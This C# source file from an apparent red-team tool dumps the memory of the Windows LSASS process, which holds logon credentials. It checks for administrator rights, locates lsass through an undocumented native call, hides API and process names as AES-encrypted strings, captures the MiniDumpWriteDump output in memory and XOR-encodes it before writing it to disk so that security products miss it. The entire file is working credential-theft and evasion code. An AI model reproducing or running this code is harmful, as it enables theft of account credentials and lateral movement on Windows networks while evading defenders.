﻿using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using static CustomD.Configuration;
using static CustomD.HelperFunctions;
using static CustomD.Win32;


namespace CustomD
{
    internal class DumpProc
    {
        // Get process by name using NtGetNextProcess and GetProcessImageFileName
        public static int GetByName(string proc_name)
        {
            // Resolve functions from delegates
            IntPtr k32 = GetLibAddress(Kernel32_enc_str);
            IntPtr ntdll = GetLibAddress(Ntdll_enc_str);
            // Load Psapi.dll library
            LoadLibraryDelegate auxLoadLibrary = (LoadLibraryDelegate)GetFuncDelegate(k32, LoadLibrary_enc_str, typeof(LoadLibraryDelegate));
            String Psapi_dec_str = DecryptStringFromBytes(Psapi_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            IntPtr psapi = auxLoadLibrary(Psapi_dec_str);
            GetProcessIdDelegate auxGetProcessId = (GetProcessIdDelegate)GetFuncDelegate(k32, GetProcessId_enc_str, typeof(GetProcessIdDelegate));
            NtGetNextProcessDelegate auxNtGetNextProcess = (NtGetNextProcessDelegate)GetFuncDelegate(ntdll, NtGetNextProcess_enc_str, typeof(NtGetNextProcessDelegate));
            GetProcessImageFileNameDelegate auxGetProcessImageFileName = (GetProcessImageFileNameDelegate)GetFuncDelegate(psapi, GetProcessImageFileName_enc_str, typeof(GetProcessImageFileNameDelegate));

            // Loop to check each process
            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;
            int pid = 0;
            while (!auxNtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
            {
                StringBuilder fileName = new StringBuilder(100);
                auxGetProcessImageFileName(aux_handle, fileName, 100);
                char[] stringArray = fileName.ToString().ToCharArray();
                Array.Reverse(stringArray);
                string reversedStr = new string(stringArray);
                string res = reversedStr.Substring(0, reversedStr.IndexOf("\\"));
                stringArray = res.ToString().ToCharArray();
                Array.Reverse(stringArray);
                reversedStr = new string(stringArray);
                if (reversedStr == proc_name)
                {
                    pid = auxGetProcessId(aux_handle);
                    return pid;
                }
            }
            return 0;
        }


        public static bool CallBackFunction(int CallbackParam, IntPtr PointerCallbackInput, IntPtr PointerCallbackOutput)
        {
            var callbackInput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(PointerCallbackInput);
            var callbackOutput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(PointerCallbackOutput);

            // IoStartCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoStartCallback)
            {
                // Set S_FALSE in output
                callbackOutput.status = 0x1;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }

            // IoWriteAllCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback)
            {
                // Copy buffer
                Marshal.Copy(callbackInput.Io.Buffer, Program.dumpBuffer, (int)callbackInput.Io.Offset, callbackInput.Io.BufferBytes);
                Program.bufferSize += callbackInput.Io.BufferBytes;
                // Set S_OK in output
                callbackOutput.status = 0;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }

            // IoWriteAllCallback
            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoFinishCallback)
            {
                // Set S_OK in output
                callbackOutput.status = 0;
                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
            }
            return true;
        }


        static void EncodeBuffer(byte[] dumpBuffer, int bufferSize, byte xor_byte)
        {
            for (int i = 0; i < bufferSize; i++)
            {
                dumpBuffer[i] = (byte)(dumpBuffer[i] ^ xor_byte);
            }
        }


        static void CheckPrivileges()
        {
            if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                Environment.Exit(0);
            }
        }


        public static void DumpLsass(string filename)
        {
            // Check we are running an elevated process
            CheckPrivileges();

            // Resolve functions from delegates
            IntPtr k32 = GetLibAddress(Kernel32_enc_str);
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)GetFuncDelegate(k32, OpenProcess_enc_str, typeof(OpenProcessDelegate));
            LoadLibraryDelegate auxLoadLibrary = (LoadLibraryDelegate)GetFuncDelegate(k32, LoadLibrary_enc_str, typeof(LoadLibraryDelegate));
            // Load dbgcore library
            String Dbgcore_dec_str = DecryptStringFromBytes(Dbgcore_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            IntPtr dbgc = auxLoadLibrary(Dbgcore_dec_str);
            MinidumpWriteDelegate auxMiniDumpWriteDump = (MinidumpWriteDelegate)GetFuncDelegate(dbgc, MinidumpWriteDump_enc_str, typeof(MinidumpWriteDelegate));

            //Get process PID
            String Lsass_dec_str = DecryptStringFromBytes(Lsass_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            int processPID = GetByName(Lsass_dec_str); // Process.GetProcessesByName(decryptedProcess)[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);


            // Open handle to the process
            IntPtr processHandle = auxOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, processPID);

            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process created correctly.");

                // Dump the process
                CallBack MyCallBack = new CallBack(CallBackFunction);
                MINIDUMP_CALLBACK_INFORMATION mci;
                mci.CallbackRoutine = Marshal.GetFunctionPointerForDelegate(MyCallBack);
                mci.CallbackParam = IntPtr.Zero;
                IntPtr mci_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(mci));
                Marshal.StructureToPtr(mci, mci_pointer, true);
                bool isRead = auxMiniDumpWriteDump(processHandle, processPID, IntPtr.Zero, 2, IntPtr.Zero, IntPtr.Zero, mci_pointer);
                Marshal.FreeHGlobal(mci_pointer);
                if (!isRead)
                {
                    Console.WriteLine("[-] Error: Process not dumped.");
                }

                // Close handle
                CloseHandle(processHandle);

                /*
                // Print information about dump in memory 
                GCHandle pinnedArray = GCHandle.Alloc(dumpBuffer, GCHandleType.Pinned);
                IntPtr dumpBuffer_pointer = pinnedArray.AddrOfPinnedObject();
                Console.WriteLine("[+] Dump address: \t\t0x" + dumpBuffer_pointer.ToString("X"));
                Console.WriteLine("[+] Dump size: \t\t\t" + bufferSize + " bytes");
                pinnedArray.Free();
                */

                // Encode buffer
                byte xor_byte = (byte)0xCC;
                EncodeBuffer(Program.dumpBuffer, Program.bufferSize, xor_byte);

                // Write to file
                IntPtr hFile = CreateFileA(filename, GENERIC_ALL, FILE_SHARE_WRITE, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                WriteFile(hFile, Program.dumpBuffer, (uint)Program.bufferSize, out _, IntPtr.Zero);
                Console.WriteLine("[+] File " + filename);
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process is NULL.");
            }
        }

    }
}